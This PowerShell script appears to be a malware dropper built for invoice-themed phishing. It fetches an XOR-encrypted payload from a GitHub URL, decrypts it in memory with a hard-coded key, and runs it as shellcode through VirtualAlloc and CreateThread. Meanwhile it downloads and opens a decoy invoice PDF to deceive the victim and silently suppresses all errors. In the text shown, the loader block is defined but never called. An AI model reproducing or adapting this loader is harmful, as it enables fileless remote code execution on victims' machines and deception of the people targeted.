
$loaderUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor"

$decoyPdfUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice for Load ID 80814532.pdf"

$xorKey = 'i0xuFnZOf69X7bktf3Vs'
# ========================================================



try {
   
    $loaderJob = {
        param($url, $key)
        
        $CSharpCode = @"
using System;
using System.Runtime.InteropServices;
public class Executor {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    public static void Execute(byte[] code) {
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)code.Length, 0x3000, 0x40);
        Marshal.Copy(code, 0, funcAddr, code.Length);
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@
        Add-Type -TypeDefinition $CSharpCode

        # Download and de-obfuscate the loader in memory
        $webClient = New-Object System.Net.WebClient
        $xorBytes = $webClient.DownloadData($url)
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
        $keyLen = $keyBytes.Length
        for ($i = 0; $i -lt $xorBytes.Length; $i++) {
            $xorBytes[$i] = $xorBytes[$i] -bxor $keyBytes[$i % $keyLen]
        }

        # Execute the loader from the memory buffer
        [Executor]::Execute($xorBytes)
    }

    $tempPdfPath = "$env:TEMP\invoice_details.pdf"
    (New-Object System.Net.WebClient).DownloadFile($decoyPdfUrl, $tempPdfPath)
    
    # Open the PDF, completing the illusion.
    Start-Process -FilePath $tempPdfPath
}
catch {

}
